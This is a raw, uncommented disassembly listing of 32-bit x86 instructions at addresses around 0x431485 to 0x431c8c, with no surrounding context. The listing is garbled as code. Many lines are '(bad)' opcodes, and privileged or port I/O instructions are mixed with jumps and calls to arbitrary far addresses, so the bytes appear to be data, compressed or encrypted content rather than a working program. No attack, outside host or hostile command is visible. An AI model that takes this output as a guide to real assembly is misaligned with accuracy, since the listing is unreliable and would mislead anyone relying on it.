  431485:	(bad)  
  431486:	xchg   esi,eax
  431487:	aam    0xcf
  431489:	out    dx,al
  43148a:	mov    DWORD PTR [esi-0x68],edi
  43148d:	inc    ebp
  43148e:	dec    edx
  43148f:	pop    ecx
  431490:	mov    edx,DWORD PTR [eax]
  431492:	repnz push bp
  431495:	or     BYTE PTR [ebx+0x55106638],0x49
  43149c:	(bad)  
  43149d:	repnz xor eax,0xa0898945
  4314a3:	mov    ah,0x89
  4314a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4314ab:	inc    DWORD PTR [ebp+0x50]
  4314ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314b2:	mov    DWORD PTR [eax],ecx
  4314b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314b5:	pop    es
  4314b6:	inc    ecx
  4314b7:	(bad)  
  4314b8:	data16 fwait
  4314ba:	inc    ebp
  4314bb:	xor    ah,BYTE PTR [esi+0x3]
  4314be:	dec    ebp
  4314bf:	push   eax
  4314c0:	inc    bp
  4314c2:	jge    0x431447
  4314c4:	mov    esp,DWORD PTR [esi-0x18]
  4314c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314cd:	add    DWORD PTR [ebx],esi
  4314cf:	add    BYTE PTR [ebx],al
  4314d1:	test   DWORD PTR [ebx],esi
  4314d3:	(bad)  
  4314d4:	inc    WORD PTR [ebp+0x0]
  4314d8:	mov    eax,DWORD PTR [eax]
  4314da:	call   0x8898cc0f
  4314df:	mov    esi,eax
  4314e1:	clc    
  4314e2:	ret    
  4314e3:	rol    cl,0xa
  4314e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4314ec:	mov    edx,edi
  4314ee:	pushf  
  4314ef:	pop    es
  4314f0:	jmp    FWORD PTR [edx+0x66]
  4314f3:	add    BYTE PTR [ebp-0x990175],al
  4314f9:	inc    ebp
  4314fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431500:	push   ebp
  431501:	mov    edi,eax
  431503:	mov    dh,BYTE PTR [eax+0x266ff51]
  431509:	push   ebp
  43150a:	add    BYTE PTR [ebx-0x764b0777],al
  431510:	dec    DWORD PTR [esi+0x661851e8]
  431516:	add    BYTE PTR [ebp-0x7b],dl
  431519:	cmp    esi,0xfffffffb
  43151c:	dec    DWORD PTR [ecx+0x51fe9285]
  431522:	jmp    DWORD PTR [esi-0x75]
  431525:	push   ebp
  431526:	hlt    
  431527:	data16 (bad) 
  431529:	dec    ebp
  43152a:	ret    
  43152b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431531:	lea    edx,[eax-0x1]
  431534:	jne    0x431507
  431536:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43153c:	dec    BYTE PTR [ecx+0x51559eff]
  431542:	mov    DWORD PTR [esi-0x4c],esp
  431545:	push   ebp
  431546:	jmp    DWORD PTR [esi-0x18]
  431549:	inc    ebp
  43154a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431550:	(bad)  
  431551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431552:	inc    eax
  431554:	test   DWORD PTR [esi-0x2],esp
  431557:	inc    ebp
  431558:	dec    DWORD PTR [ebp-0x760bde75]
  43155e:	(bad)  
  43155f:	test   al,0xc3
  431561:	mov    DWORD PTR [ebp-0x769b56],ecx
  431567:	lods   al,BYTE PTR ds:[esi]
  431568:	push   eax
  431569:	inc    ebp
  43156a:	jne    0x43157b
  43156c:	dec    DWORD PTR [ebp+0x8]
  43156f:	mov    ecx,DWORD PTR [ebx]
  431571:	sbb    al,0x0
  431573:	(bad)  
  431574:	mov    eax,0xc14fc3
  431579:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43157f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431583:	xor    eax,DWORD PTR [eax]
  431585:	add    eax,edi
  431587:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43158d:	xor    edi,DWORD PTR [eax+0x854f66]
  431593:	dec    BYTE PTR [ecx-0x76bb01]
  431599:	mov    BYTE PTR [ebx-0x76724001],al
  43159f:	pushf  
  4315a0:	inc    esi
  4315a1:	(bad)  
  4315a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4315a8:	sar    esi,0x89
  4315ab:	dec    DWORD PTR [eax+0x0]
  4315ae:	inc    DWORD PTR [eax]
  4315b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315b7:	xlat   BYTE PTR ds:[ebx]
  4315b8:	dec    edx
  4315b9:	add    bh,bh
  4315bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315c1:	lea    esp,[esi-0x50]
  4315c4:	(bad)  
  4315c5:	(bad)  
  4315c6:	call   DWORD PTR [eax-0x1]
  4315c9:	inc    ebp
  4315ca:	rdpmc  
  4315cc:	add    BYTE PTR [ebx],al
  4315ce:	push   ax
  4315d0:	lea    eax,[ebp-0x1]
  4315d6:	js     0x4315d7
  4315d8:	add    al,bh
  4315da:	push   bp
  4315dc:	lea    ecx,[ebp-0x7701]
  4315e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4315e8:	(bad)  
  4315e9:	(bad)  
  4315ea:	(bad)  
  4315eb:	(bad)  
  4315ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4315f2:	dec    eax
  4315f3:	mov    eax,0x8d8dffff
  4315f8:	mov    al,0xb0
  4315fa:	(bad)  
  4315fb:	call   DWORD PTR [ecx+0x50]
  4315fe:	dec    ebp
  4315ff:	inc    ebp
  431600:	mov    esi,0x7030833
  431605:	push   eax
  431606:	into   
  431607:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43160d:	call   DWORD PTR [ecx-0x8]
  431610:	lea    edx,[ebp-0x1]
  431613:	jmp    0x761817
  431618:	inc    eax
  431619:	jnp    0x4315a8
  43161b:	add    dh,bh
  43161d:	inc    WORD PTR [ebp-0x8a00b0]
  431624:	mov    edx,eax
  431626:	inc    esp
  431627:	add    bh,bh
  431629:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43162f:	dec    DWORD PTR [ebx-0x7f820301]
  431635:	add    BYTE PTR [ecx],al
  431637:	data16 add BYTE PTR [ebp-0xb30077],al
  43163e:	inc    eax
  431640:	(bad)  
  431641:	dec    si
  431643:	test   edi,edi
  431645:	(bad)  
  431646:	cmp    edi,edi
  431648:	add    ecx,DWORD PTR [edi-0x39]
  43164b:	mov    edx,DWORD PTR [edx+0x66]
  43164e:	inc    DWORD PTR [ebp-0x3d00cb]
  431654:	mov    eax,0x66ff8b5e
  43165a:	jmp    0xb4ff:0xc7ff3895
  431661:	push   ecx
  431662:	inc    DWORD PTR [ebx-0x76ffccbb]
  431668:	call   DWORD PTR [esi-0x1]
  43166b:	dec    DWORD PTR [eax]
  43166d:	mov    ecx,0x805ff
  431672:	inc    ebp
  431673:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431679:	mov    ecx,0x35784
  43167e:	add    BYTE PTR [ecx-0xffa59b],cl
  431684:	inc    ebp
  431685:	mov    ecx,0x9c6131
  43168a:	(bad)  
  43168b:	mov    eax,ebx
  43168d:	pop    esp
  43168e:	test   edi,edi
  431690:	clc    
  431691:	lea    eax,[ebp-0x24]
  431694:	cmp    eax,0xc7fe9c8d
  431699:	push   eax
  43169b:	lea    eax,[ebp+0x45fff8fe]
  4316a1:	mov    esi,DWORD PTR [ecx]
  4316a3:	hlt    
  4316a4:	lahf   
  4316a5:	push   esp
  4316a6:	mov    edx,DWORD PTR [ecx-0x4]
  4316a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316af:	add    BYTE PTR [ebp-0x35],al
  4316b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316b8:	mov    edx,DWORD PTR [ecx-0x74]
  4316bb:	rol    BYTE PTR [eax],0x8d
  4316be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316c2:	nop
  4316c3:	push   ecx
  4316c4:	add    bh,bh
  4316c6:	mov    esp,edi
  4316c8:	in     al,0x85
  4316ca:	jge    0x4316ca
  4316cc:	test   edi,edi
  4316ce:	jne    0x431655
  4316d0:	(bad)  
  4316d1:	(bad)  
  4316d2:	sbb    bh,bh
  4316d4:	push   ebp
  4316d5:	inc    ebp
  4316d6:	call   0xffdc1166
  4316db:	add    BYTE PTR [ebp+0x66],al
  4316de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316e4:	cmp    al,0x85
  4316e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4316ea:	test   DWORD PTR [edi+0x74],ecx
  4316ed:	dec    edi
  4316ee:	inc    DWORD PTR [ebp-0x530004]
  4316f4:	dec    DWORD PTR [edi-0x75]
  4316f7:	dec    esi
  4316f8:	cld    
  4316f9:	test   DWORD PTR [eax+0xff01ff],eax
  4316ff:	icebp  
  431700:	add    BYTE PTR [edi-0x3a],cl
  431703:	test   ebx,eax
  431705:	inc    BYTE PTR [ebp-0x1]
  431708:	jne    0x43170a
  43170a:	mov    eax,DWORD PTR [eax]
  43170c:	cld    
  43170d:	xor    BYTE PTR [ecx+0x500155],cl
  431713:	push   ebp
  431714:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43171a:	add    BYTE PTR [ebp+0x35e90f50],al
  431720:	add    al,BYTE PTR [eax]
  431722:	add    BYTE PTR [ebx-0x38fe4f80],al
  431728:	add    ah,ch
  43172a:	or     BYTE PTR [ebp+0x4501f845],dh
  431730:	jmp    0xdf1a26
  431735:	(bad)  
  431736:	nop    ecx
  431739:	test   DWORD PTR [ebp+0x4502f8],eax
  43173f:	xor    ecx,DWORD PTR [ebp-0x64]
  431742:	mov    eax,edi
  431744:	mov    ebx,DWORD PTR [eax+edx*2]
  431747:	add    eax,0x45fef885
  43174c:	dec    DWORD PTR [ebx+0x339445]
  431752:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431758:	dec    DWORD PTR [ebx-0x460f0375]
  43175e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175f:	add    esi,edi
  431761:	add    bh,bh
  431763:	rdpmc  
  431765:	add    BYTE PTR [ebx],0x1
  431768:	mov    DWORD PTR [eax],eax
  43176a:	add    al,0x45
  43176c:	dec    DWORD PTR [ecx-0x360b3373]
  431772:	dec    DWORD PTR [esi]
  431774:	push   eax
  431775:	jne    0x4317bc
  431777:	mov    esi,DWORD PTR [ebx]
  431779:	cld    
  43177a:	add    esp,ecx
  43177c:	push   eax
  43177d:	inc    DWORD PTR [ebp-0x75]
  431780:	add    eax,0x800e4
  431785:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43178b:	mov    DWORD PTR [ecx],eax
  43178d:	sbb    al,0x0
  43178f:	leave  
  431790:	test   DWORD PTR [edi-0x2],eax
  431793:	jne    0x431794
  431795:	call   0xff44019a
  43179a:	xor    BYTE PTR [ebp+0x4d],al
  43179d:	mov    edi,edi
  43179f:	enter  0x8,0x4d
  4317a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317a9:	mov    eax,DWORD PTR [eax]
  4317ab:	cld    
  4317ac:	add    DWORD PTR [ecx],ebx
  4317ae:	inc    ebp
  4317af:	dec    ebp
  4317b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317b6:	inc    eax
  4317b7:	dec    DWORD PTR [ecx-0x270375]
  4317bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4317c3:	xchg   ecx,eax
  4317c4:	ret    
  4317c5:	add    BYTE PTR [ebp-0x830075],al
  4317cb:	add    BYTE PTR [ebp-0x75],al
  4317ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317d4:	lea    edi,[edi-0xc]
  4317d7:	add    bh,bh
  4317d9:	mov    edx,DWORD PTR [eax-0x7b]
  4317dc:	inc    ebp
  4317dd:	rdpmc  
  4317df:	jne    0x4317e4
  4317e1:	add    BYTE PTR [eax-0x75],dl
  4317e4:	inc    ebp
  4317e5:	clc    
  4317e6:	add    eax,0x400009
  4317eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4317f1:	mov    eax,DWORD PTR [ecx]
  4317f3:	in     al,dx
  4317f4:	add    dh,al
  4317f6:	test   ebx,eax
  4317f8:	inc    BYTE PTR [ebp-0xff0001]
  4317fe:	add    BYTE PTR [ebp-0x43],al
  431801:	cmp    esi,0xfffffff8
  431804:	(bad)  
  431805:	push   DWORD PTR [eax]
  431807:	add    BYTE PTR [ebp-0x3a],dl
  43180a:	test   ebx,eax
  43180c:	je     0x431793
  43180e:	mov    edi,edi
  431810:	sbb    al,0xff
  431812:	test   DWORD PTR gs:[eax],eax
  431815:	(bad)  
  431816:	js     0x431817
  431818:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43181e:	sub    eax,ebx
  431820:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431826:	add    eax,DWORD PTR [eax]
  431828:	dec    ebp
  431829:	push   eax
  43182a:	mov    al,BYTE PTR [ebp+0x1]
  43182d:	mov    eax,DWORD PTR [ebp-0x68]
  431830:	mov    eax,DWORD PTR [eax]
  431832:	sbb    bh,al
  431834:	or     ah,dh
  431836:	dec    ebp
  431837:	inc    DWORD PTR [eax+0x4]
  43183a:	push   ecx
  43183b:	add    BYTE PTR [edx-0x1],dh
  43183e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431844:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43184e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431854:	push   ecx
  431855:	cmp    BYTE PTR [ebx],al
  431857:	inc    ebp
  431858:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	in     al,0xff
  431862:	add    BYTE PTR [ebp+0x0],al
  431865:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43186b:	add    al,bh
  43186d:	(bad)  
  43186e:	jmp    0x8d85:0x74b0558d
  431875:	dec    DWORD PTR [eax]
  431877:	call   DWORD PTR [ebp-0x7b]
  43187a:	mov    edi,esi
  43187c:	lock call DWORD PTR [ebp-0x75]
  431880:	mov    esi,esp
  431882:	mov    ah,0xc6
  431884:	mov    bh,0xc3
  431886:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43188c:	add    DWORD PTR [eax],0x450050ff
  431892:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431898:	inc    edi
  43189a:	push   esp
  43189c:	jmp    0xcd00:0x650481ff
  4318a3:	mov    DWORD PTR [ebx],esi
  4318a5:	clc    
  4318a6:	cmp    edi,0xff9cff3c
  4318ac:	jne    0x4318b6
  4318ae:	mov    eax,eax
  4318b0:	add    esi,DWORD PTR [eax]
  4318b2:	int3   
  4318b3:	inc    ebp
  4318b4:	cmp    al,0x83
  4318b6:	add    BYTE PTR [eax],bl
  4318b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318c4:	mov    edi,eax
  4318c6:	cmp    BYTE PTR [ebp+0x45],cl
  4318c9:	jmp    0x431856
  4318cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318ce:	inc    ebp
  4318cf:	or     al,0x2
  4318d1:	dec    DWORD PTR [ebp+0x18]
  4318d4:	jne    0x43192b
  4318d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318dc:	mov    edi,DWORD PTR [ebx]
  4318de:	in     al,0x50
  4318e0:	xchg   ecx,eax
  4318e1:	jmp    0x34367e6
  4318e6:	adc    al,0x8b
  4318e8:	inc    ebp
  4318e9:	mov    al,ds:0x8b04008b
  4318ee:	push   ebp
  4318ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4318f5:	push   ebp
  4318f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4318fc:	inc    ebp
  4318fd:	dec    ebp
  4318fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431904:	mov    DWORD PTR [eax],0xe9ff00f4
  43190a:	add    al,0x0
  43190c:	add    BYTE PTR [eax],al
  43190e:	mov    eax,edx
  431910:	push   eax
  431911:	rol    DWORD PTR [ebp-0xf0177],1
  431917:	bound  eax,QWORD PTR [ebp+0x50]
  43191a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431920:	add    BYTE PTR [ecx+0x558df0ff],cl
  431926:	mov    al,0xf
  431928:	test   DWORD PTR [edx],edx
  43192a:	call   DWORD PTR [ebp-0x7a0001]
  431930:	(bad)  
  431931:	loop   0x431932
  431933:	jnp    0xc6990d39
  431939:	mov    eax,ebx
  43193b:	cmp    al,0x8b
  43193d:	(bad)  
  43193e:	cld    
  43193f:	shr    esi,0xc
  431942:	add    dl,al
  431944:	push   eax
  431945:	lea    eax,[ebp-0x1]
  431948:	mov    edx,esi
  43194a:	cwde   
  43194b:	cli    
  43194c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431952:	or     BYTE PTR [eax],cl
  431954:	inc    ebp
  431955:	dec    ebp
  431956:	inc    DWORD PTR [ebx+0x74803914]
  43195c:	add    DWORD PTR [ebx+0x451800],ecx
  431962:	call   DWORD PTR [eax+edx*1]
  431965:	add    ecx,DWORD PTR [ebp-0x34]
  431968:	push   edi
  431969:	adc    al,0x8
  43196b:	mov    edx,DWORD PTR [ebp-0x14]
  43196e:	mov    ecx,DWORD PTR [ebp+0x18]
  431971:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431975:	inc    DWORD PTR [eax+esi*8]
  431978:	inc    ebp
  431979:	stos   BYTE PTR es:[edi],al
  43197a:	mov    edx,DWORD PTR [ebp-0x4]
  43197d:	add    DWORD PTR [ebp-0x1c],eax
  431980:	mov    edx,DWORD PTR [ebp-0x70]
  431983:	cmp    eax,DWORD PTR [eax]
  431985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431986:	mov    eax,DWORD PTR [eax]
  431988:	cld    
  431989:	jae    0x43190b
  43198b:	add    eax,DWORD PTR [ecx]
  43198d:	clc    
  43198e:	add    BYTE PTR [eax+0x30],dl
  431991:	mov    DWORD PTR [ecx],esi
  431993:	clc    
  431994:	pop    ds
  431995:	inc    ebp
  431996:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43199c:	(bad)  
  43199d:	push   DWORD PTR [edi]
  43199f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319a5:	(bad)  
  4319a6:	jae    0x4319a7
  4319a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4319ae:	sub    eax,DWORD PTR [eax]
  4319b0:	add    eax,DWORD PTR [eax]
  4319b2:	mov    DWORD PTR [ecx+0x5f],eax
  4319b5:	mov    DWORD PTR [ebx-0x4],ebx
  4319b8:	ret    0xff
  4319bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319c1:	ret    
  4319c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319c8:	add    BYTE PTR [ebp-0x7d],al
  4319cb:	mov    DWORD PTR [eax],eax
  4319cd:	add    al,0x84
  4319cf:	inc    DWORD PTR [ecx]
  4319d1:	lea    eax,[eax]
  4319d3:	hlt    
  4319d4:	sar    bh,cl
  4319d6:	test   BYTE PTR [eax+0x1],dl
  4319d9:	inc    ebp
  4319da:	add    BYTE PTR [ebx],dh
  4319dc:	test   BYTE PTR [ebx],0x84
  4319df:	push   eax
  4319e0:	add    BYTE PTR [ebp+0x0],al
  4319e3:	add    eax,0x86
  4319e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4319ee:	add    BYTE PTR [ecx],al
  4319f0:	add    BYTE PTR [eax],al
  4319f2:	mov    esi,0x550030
  4319f7:	mov    ecx,DWORD PTR [edi]
  4319f9:	cld    
  4319fa:	fidiv  DWORD PTR [ebp+0x0]
  4319fd:	mov    edi,DWORD PTR [ecx]
  4319ff:	xor    BYTE PTR [eax+eax*1],0x84
  431a03:	add    eax,DWORD PTR [eax]
  431a05:	sbb    BYTE PTR [eax],al
  431a07:	jne    0x4319ba
  431a09:	mov    eax,DWORD PTR [ecx]
  431a0b:	sbb    BYTE PTR [eax],al
  431a0d:	mov    DWORD PTR [ebp-0x1],esp
  431a10:	add    BYTE PTR [eax+0x30e45ca],bh
  431a16:	ret    0xb7fc
  431a19:	dec    ebp
  431a1a:	or     al,0x89
  431a1c:	dec    ebp
  431a1d:	cld    
  431a1e:	cmovne ecx,DWORD PTR [eax-0x75]
  431a22:	add    edi,esp
  431a24:	seto   BYTE PTR [esi-0x72ffffff]
  431a2b:	inc    ebp
  431a2c:	adc    al,0x8b
  431a2e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a35:	cmp    DWORD PTR [edi+0x72],edx
  431a38:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a3e:	gs cmp al,0x0
  431a41:	je     0x431a19
  431a43:	push   eax
  431a44:	sar    BYTE PTR [eax],1
  431a46:	mov    bh,0x3e
  431a48:	push   cs
  431a49:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a4f:	add    DWORD PTR [ecx+0x12],ebp
  431a52:	dec    edx
  431a53:	(bad)  
  431a54:	mov    eax,edx
  431a56:	in     al,dx
  431a57:	adc    DWORD PTR [ecx],esi
  431a59:	pop    esi
  431a5a:	inc    ecx
  431a5b:	leave  
  431a5c:	or     DWORD PTR [eax],ebx
  431a5e:	gs push ebp
  431a60:	add    ah,ch
  431a62:	into   
  431a63:	in     al,dx
  431a64:	enter  0xb756,0xf0
  431a68:	push   cs
  431a69:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a73:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a79:	jnp    0x74439f81
  431a7f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a85:	add    BYTE PTR [edi],cl
  431a87:	mov    edi,DWORD PTR [ecx-0x78]
  431a8a:	ltr    WORD PTR [ecx-0x7b]
  431a8e:	dec    DWORD PTR [edi]
  431a90:	clc    
  431a91:	out    0x45,eax
  431a93:	add    BYTE PTR [eax],cl
  431a95:	cmp    ebx,0xffffff8c
  431a98:	jge    0x431a9a
  431a9a:	jb     0x431aac
  431a9c:	je     0x521b1c
  431aa2:	pop    edx
  431aa3:	push   esi
  431aa4:	mov    ecx,DWORD PTR [edi]
  431aa6:	in     al,dx
  431aa7:	rol    DWORD PTR [ebp+0x0],1
  431aaa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ab1:	cmp    DWORD PTR [ecx],0xfffffff0
  431ab4:	hlt    
  431ab5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431abb:	(bad)  
  431abd:	push   eax
  431abe:	jns    0xb842ff3c
  431ac4:	lock push cs
  431ac6:	ror    edx,0x3
  431ac9:	test   BYTE PTR [ecx+0x5500e800],cl
  431acf:	dec    eax
  431ad0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ad4:	(bad)  
  431ad5:	mov    esi,0x7f33ff5f
  431ada:	inc    eax
  431adb:	test   DWORD PTR [edx],eax
  431add:	je     0x431a9f
  431adf:	mov    ecx,ecx
  431ae1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431ae5:	and    eax,DWORD PTR [eax+0xf0103]
  431aeb:	jp     0x431ad9
  431aed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431af1:	add    edx,DWORD PTR [edi+0x74]
  431af4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431afa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b00:	je     0x431a85
  431b02:	cmp    eax,edi
  431b04:	js     0x431b29
  431b06:	add    eax,0xeb0fc003
  431b0b:	jns    0x431a98
  431b0d:	vmread DWORD PTR [ecx+0x45],ebx
  431b11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b17:	adc    al,0x8b
  431b19:	jge    0x431b2f
  431b1b:	mov    edi,DWORD PTR [eax-0x4]
  431b1e:	add    edi,DWORD PTR [edi]
  431b20:	or     bh,bh
  431b22:	push   ebp
  431b23:	push   es
  431b24:	mov    DWORD PTR [ebp-0x4],ebx
  431b27:	add    edi,esi
  431b29:	pop    es
  431b2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b30:	mov    DWORD PTR [esp+esi*8],ecx
  431b33:	inc    ebp
  431b34:	pop    ebp
  431b35:	xor    DWORD PTR [esi-0x4],0x3b
  431b39:	add    edx,DWORD PTR [ecx+edi*1]
  431b3c:	push   es
  431b3d:	clc    
  431b3e:	mov    bh,0xdb
  431b40:	jp     0x431af9
  431b42:	add    cl,BYTE PTR [esi]
  431b44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b4a:	test   edi,edi
  431b4c:	je     0x431b42
  431b4e:	mov    eax,ecx
  431b50:	or     BYTE PTR [ebx],al
  431b52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b58:	jbe    0x431bcc
  431b5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b60:	add    ecx,DWORD PTR [esi]
  431b62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b68:	add    eax,DWORD PTR [ebx-0x287af783]
  431b6e:	je     0x431bbd
  431b70:	mov    DWORD PTR [ecx],edi
  431b72:	mov    esi,eax
  431b74:	hlt    
  431b75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b7c:	jb     0x431b3e
  431b7e:	jmp    0x431b6b
  431b80:	xor    esi,DWORD PTR [ebx]
  431b82:	pop    edi
  431b83:	pop    esi
  431b84:	pop    ebx
  431b85:	ret    
  431b86:	ret    0x8b
  431b89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b8f:	xor    DWORD PTR [ecx],0xc
  431b92:	pushf  
  431b93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b99:	rdmsr  
  431b9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431ba2:	dec    ebp
  431ba3:	ret    
  431ba4:	mov    edi,DWORD PTR [esi-0x4]
  431ba7:	pop    eax
  431ba8:	dec    ebp
  431ba9:	jne    0x431b36
  431bab:	xor    edi,esp
  431bad:	inc    eax
  431bae:	dec    ebp
  431baf:	jbe    0x431c04
  431bb1:	inc    eax
  431bb2:	pop    ebp
  431bb3:	add    edx,DWORD PTR [esi+0x8]
  431bb6:	push   esp
  431bb7:	dec    eax
  431bb8:	push   ecx
  431bb9:	mov    eax,edi
  431bbb:	and    al,0xf0
  431bbd:	jo     0x431baa
  431bbf:	mov    eax,DWORD PTR [ebx]
  431bc1:	sbb    BYTE PTR [ebp+0x4d],cl
  431bc4:	mov    eax,DWORD PTR [ebx]
  431bc6:	nop
  431bc7:	or     BYTE PTR [eax],al
  431bc9:	jne    0x431c22
  431bcb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431bd1:	cld    
  431bd2:	xor    edi,edi
  431bd4:	add    edi,DWORD PTR [ebp+0x3]
  431bd7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bdd:	js     0x431b63
  431bdf:	jae    0x431be3
  431be1:	(bad)  
  431be3:	xor    al,0x5d
  431be5:	jmp    0x431b72
  431be7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431bee:	fdecstp 
  431bf0:	test   BYTE PTR [edi],ah
  431bf2:	add    bh,BYTE PTR [ebp+0x0]
  431bf5:	add    ebx,DWORD PTR [ebp-0x77]
  431bf8:	mov    edi,eax
  431bfa:	cmp    al,0x0
  431bfd:	adc    dh,BYTE PTR [ebx]
  431bff:	jge    0x431c04
  431c01:	mov    edi,DWORD PTR [ebx]
  431c03:	jl     0x431c14
  431c05:	clc    
  431c06:	dec    edi
  431c07:	jge    0x431c09
  431c09:	mov    eax,DWORD PTR [ebx]
  431c0b:	jb     0x431c15
  431c0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431c10:	mov    edi,edi
  431c12:	xor    edx,DWORD PTR [eax]
  431c14:	add    edi,DWORD PTR [ebx]
  431c16:	mov    DWORD PTR [ebp-0x10],edi
  431c19:	inc    edi
  431c1a:	pop    ebp
  431c1b:	jge    0x431c58
  431c1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c21:	mov    edx,0xc05d87f0
  431c26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c2a:	fimul  WORD PTR [eax]
  431c2c:	fist   WORD PTR [ebp+0x1c]
  431c2f:	in     al,dx
  431c30:	jne    0x431c1e
  431c32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c3c:	fdivp  st(0),st
  431c3e:	fild   WORD PTR [ebp+0x4510f85c]
  431c44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c4a:	inc    ebp
  431c4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c51:	mov    ebp,DWORD PTR [ebx-0x4]
  431c54:	adc    al,0x8b
  431c56:	rcl    DWORD PTR [eax],0x48
  431c59:	mov    esi,0x7080803
  431c5e:	fiadd  WORD PTR [ebp+0x4d]
  431c61:	(bad)  
  431c62:	mov    edx,DWORD PTR [edx-0x4]
  431c65:	mov    edx,DWORD PTR [ebp-0x4]
  431c68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c6e:	mov    DWORD PTR [edi+0x872dc],edi
  431c74:	xlat   BYTE PTR ds:[ebx]
  431c75:	into   
  431c76:	ffreep st(6)
  431c78:	retf   0x6c7
  431c7b:	iret   
  431c7c:	dec    ebp
  431c7d:	inc    ebp
  431c7e:	mov    DWORD PTR [ebx],edi
  431c80:	fmul   QWORD PTR [edi]
  431c82:	dec    ebp
  431c83:	jnp    0x431cb8
  431c85:	add    BYTE PTR [ebx],al
  431c87:	mov    ecx,DWORD PTR [esp+edi*8]
  431c8a:	inc    ebp
  431c8b:	dec    ebp
  431c8c:	lea    esi,[ebx]
